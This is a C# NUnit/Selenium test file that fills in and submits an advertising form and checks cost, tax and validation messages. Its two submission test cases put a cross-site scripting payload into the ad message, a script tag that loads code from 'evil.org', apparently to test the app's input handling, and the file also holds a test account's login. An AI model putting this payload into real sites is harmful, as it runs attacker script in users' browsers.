using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using NUnit.Framework;
using OpenQA.Selenium;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Support.UI;
using System.Configuration;
using DAO;
using DataCache;
using System.IO;
using OpenQA.Selenium.IE;
using OpenQA.Selenium.Chrome;
using DAO.Models;
using System.Collections.Generic;
using System.Linq;
using Common;
using Repository;
using OpenQA.Selenium.Interactions;
using DTO.Db;

namespace UnitTest.Category
{
    [TestFixture(typeof(FirefoxDriver))]
    //[TestFixture(typeof(InternetExplorerDriver))]
    [TestFixture(typeof(ChromeDriver))]
    [Category("Ads")]
    public class AdsUnitTestWA<TWebDriver> where TWebDriver : IWebDriver, new()
    {
        private IWebDriver driver;
        private readonly int waitTime = 10;
        private StringBuilder verificationErrors;
        private string baseURL = ConfigurationManager.AppSettings["baseurl"];
        private string partyPic = ConfigurationManager.AppSettings["pic.capture"];
        private static string Category = "Ads";
        private string rootFolder = ConfigurationManager.AppSettings["db.rootfolder"];
        private string database = ConfigurationManager.AppSettings["redis.database"];
        private string rootFolderCategory = ConfigurationManager.AppSettings["db.ads"];
        private StoredProcedureExtender spContext = new StoredProcedureExtender();
        private RedisCacheProviderExtender cache = new RedisCacheProviderExtender(true, AppSettings.RedisDatabaseId);
        private IRedisCacheProvider redisCache = new RedisCacheProvider(AppSettings.RedisDatabaseId);
        private IPartyDTORepository partyRepo = new PartyDTORepository();
        private IAdvertisementDetailsDTORepository adsRepo = new AdvertisementDetailsDTORepository();
        private IWebUserDTORepository webRepo = new WebUserDTORepository();
        private ICountryTaxDetailsDTORepository countrytaxRepo = new CountryTaxDetailsDTORepository();
        private IUserBankAccountDTORepository bankRepo = new UserBankAccountDTORepository();
        private ICountryCodeRepository countryRepo = new CountryCodeRepository();
        private UnitTestFixture setupFixture;
        [TestFixtureSetUp]
        public void Init()
        {
            string[] createtables = new string[] { "CountryTax", "Merchandise", "UserLoan", "Stock", Category };
            setupFixture = new UnitTestFixture(spContext, createtables);
            //return;
            setupFixture.BootStrapDb();
            setupFixture.LoadDataTable();

        }
        [SetUp]
        public void SetupTestData()
        {
            //string dataLoadsqlpath = @"\Sql\DataLoad" + Category + ".sql";

            //StringBuilder boostrapSql = new StringBuilder();
            //boostrapSql.Append(File.ReadAllText(rootFolder + rootFolderCategory
            //    + dataLoadsqlpath));

            //string dataPath = rootFolder + rootFolderCategory + @"Sql\Data\";
            //boostrapSql.Replace("{0}", dataPath.Replace(@"\", @"\\"));
            //spContext.ExecuteSql(boostrapSql.ToString());

            setupFixture.LoadDataTable(Category, rootFolderCategory);
            cache.FlushAllDatabase();
            string driversPath = Environment.CurrentDirectory + @"\..\..\Selenium\WebDrivers\";
            if (typeof(TWebDriver) == typeof(FirefoxDriver))
            {
                driver = new TWebDriver();
            }
            else if (typeof(TWebDriver) == typeof(ChromeDriver))
            {
                ChromeOptions options = new ChromeOptions();
                options.AddArgument("--start-maximized");
                driver = new ChromeDriver(driversPath, options);
            }
            else if (typeof(TWebDriver) == typeof(InternetExplorerDriver))
            {
                InternetExplorerOptions options = new InternetExplorerOptions { IgnoreZoomLevel = true };
                driver = new InternetExplorerDriver(driversPath, options);
            }
            else
            {
                driver = Activator.CreateInstance(typeof(TWebDriver), new object[] { driversPath }) as IWebDriver;
            }

            verificationErrors = new StringBuilder();
            if (typeof(TWebDriver) != typeof(ChromeDriver))
                driver.Manage().Window.Maximize();

        }
        [TearDown]
        public void FixtureTearDown()
        {
            if (driver != null)
            {
                driver.Quit();
            }
        }


        [Test]
        [TestCase(1, "sjohnston@gigabox.com", "UnitTest_24!", 1, 5, new int[] { 1, 2, 3, 4 }, "510,440.00"
             , new int[] { 5, 1, 2, 3, 4, 6 },
                  "2030/01/01",
                 "https://www.youtube.com/watch?v=U1jwWwJ-Mxc https://i.ytimg.com/vi/U1jwWwJ-Mxc/hqdefault.jpg <A HREF=\"http://trusted.org/search.cgi?criteria=<SCRIPT SRC='http://evil.org/badkama.js'></SCRIPT>\"> Go to trusted.org</A>",
                  "2030/01/01",
                  "Title Sample",
                      "51,044.00"
             )]
        [TestCase(1, "sjohnston@gigabox.com", "UnitTest_24!", 1, 5, new int[] { 1, 2, 3, 4 }, "510,440.00"
     , new int[] { 5, 1, 2, 3, 4, 6 },
          "today",
         "https://www.youtube.com/watch?v=U1jwWwJ-Mxc https://i.ytimg.com/vi/U1jwWwJ-Mxc/hqdefault.jpg <A HREF=\"http://trusted.org/search.cgi?criteria=<SCRIPT SRC='http://evil.org/badkama.js'></SCRIPT>\"> Go to trusted.org</A>",
          "today",
          "Title Sample",
                      "51,044.00"
     )]
        public void AdsSubmission(int userId, string emailId, string password, int adTime, sbyte adsFrequencyTypeId, int[] adsTypeList,
             string cost, int[] days, string endDate, string message, string startDate, string title, string tax)
        {
            setupFixture.Login(emailId, password, "ads", waitTime, driver);
            setupFixture.WaitForElementPreset(By.XPath("//form[@id='adsform']/div/fieldset/div/ul/li[2]/div/span[2]"), waitTime, driver);

            foreach (var item in adsTypeList)
            {
                driver.FindElement(By.XPath("(//input[@name='adsType'])[" + item + "]")).Click();
            }
            IJavaScriptExecutor js = driver as IJavaScriptExecutor;
            js.ExecuteScript("$('#postTitle').focus();");
            js.ExecuteScript("$('#main').animate({ scrollTop: 500}, 'slow');");
            driver.FindElement(By.Id("adsContent")).Clear();
            driver.FindElement(By.Id("adsContent")).SendKeys(message);


            js.ExecuteScript("$('#main').animate({ scrollTop: 800}, 'slow');");
            setupFixture.TyrUntilElementPreset(By.LinkText("1:00 Hrs"), waitTime, driver, By.Id("ddtime"));
            Thread.Sleep(2000);
            driver.FindElement(By.LinkText("1:00 Hrs")).Click();
            driver.FindElement(By.Name("adsStartDate")).Clear();
            if (endDate == "today")
            {
                endDate = DateTime.UtcNow.Date.ToString("MM/dd/yyyy");
            }
            else
            {
                endDate = DateTime.ParseExact(endDate, "yyyy/MM/dd", System.Globalization.CultureInfo.InvariantCulture).Date.ToString("MM/dd/yyyy");
            }
            if (startDate == "today")
            {
                startDate = DateTime.UtcNow.Date.ToString("MM/dd/yyyy");
            }
            else
            {
                startDate = DateTime.ParseExact(startDate, "yyyy/MM/dd", System.Globalization.CultureInfo.InvariantCulture).Date.ToString("MM/dd/yyyy");
            }

            driver.FindElement(By.Name("adsStartDate")).SendKeys(startDate);
            driver.FindElement(By.Name("adsEndDate")).SendKeys(endDate);
            //setupFixture.TyrUntilElementPreset(By.LinkText("Custom"),  waitTime, By.Id("ddrecur"));
            driver.FindElement(By.Id("ddrecur")).Click();
            js.ExecuteScript("$('#ddrecur ul').scrollTop(300);");
            driver.FindElement(By.LinkText("Custom")).Click();

            js.ExecuteScript("$('#main').animate({ scrollTop: 1000}, 'slow');");

            foreach (var item in days)
            {
                driver.FindElement(By.XPath("//div[@id='adsDaysInweek']/label[" + item + "]")).Click();
            }
            js.ExecuteScript("$('#main').animate({ scrollTop: 800}, 'slow');");
            Thread.Sleep(5000);
            js.ExecuteScript("$('#main').animate({ scrollTop: 800}, 'slow');");
            setupFixture.WaitForElementPreset(By.CssSelector("embed[type='application/x-shockwave-flash']"), waitTime, driver);
            js.ExecuteScript("$('#main').animate({ scrollTop: 1400}, 'slow');");

            setupFixture.WaitFortextPreset(By.XPath("//div[@id='myadscontent-box']/div[3]/div/div[2]/div/span[2]"), waitTime, driver, cost);
            setupFixture.WaitFortextPreset(By.XPath("//div[@id='myadscontent-box']/div[3]/div[2]/div[2]/div/span[2]"), waitTime, driver, tax);

            driver.FindElement(By.Id("saveads")).Click();
            setupFixture.WaitFortextPreset(By.CssSelector("div.col-xs-12 > span"), waitTime, driver, "Ads Successfully Submitted");
            setupFixture.WaitForNotificationUpdate(AppSettings.AdsSuccessNotificationId, userId, 1, waitTime);



        }


        [Test]
        [TestCase(1, "sjohnston@gigabox.com", "UnitTest_24!")]
        public void AdsValidation(int userId, string emailId, string password)
        {
            IJavaScriptExecutor js = driver as IJavaScriptExecutor;
            setupFixture.Login(emailId, password, "ads", waitTime, driver);
            setupFixture.WaitForElementPreset(By.XPath("//form[@id='adsform']/div/fieldset/div/ul/li[2]/div/span[2]"), waitTime, driver);
            js.ExecuteScript("$('#main').animate({ scrollTop: 1000}, 'slow');");
            setupFixture.WaitForElementPreset(By.Id("saveads"), waitTime, driver);
            Thread.Sleep(2000);
            driver.FindElement(By.Id("saveads")).Click();
            Thread.Sleep(2000);
            js.ExecuteScript("$('#main').animate({ scrollTop: 0}, 'slow');");
            setupFixture.WaitFortextPreset(By.CssSelector("span.help-block.fontsize90"), waitTime *10, driver, "You must check at least 1 box");
            setupFixture.WaitFortextPreset(By.XPath("//form[@id='adsform']/div[2]/fieldset/div/span"), waitTime, driver, "Provide a Message");
            js.ExecuteScript("$('#main').animate({ scrollTop: 800}, 'slow');");
            setupFixture.WaitFortextPreset(By.CssSelector("div.col-xs-9 > div.form-group.has-error > span.help-block.fontsize90"), waitTime, driver, "Provide a Time");
            setupFixture.WaitFortextPreset(By.XPath("//form[@id='adsform']/div[3]/fieldset/div[2]/div[2]/div/span"), waitTime, driver, "Provide a StartDate");
            setupFixture.WaitFortextPreset(By.XPath("//form[@id='adsform']/div[3]/fieldset/div[3]/div[2]/div/span"), waitTime, driver, "Provide a EndDate");
            setupFixture.WaitFortextPreset(By.XPath("//form[@id='adsform']/div[3]/fieldset/div[4]/div[2]/div/span"), waitTime, driver, "Provide a Frequency");

        }


    }
}
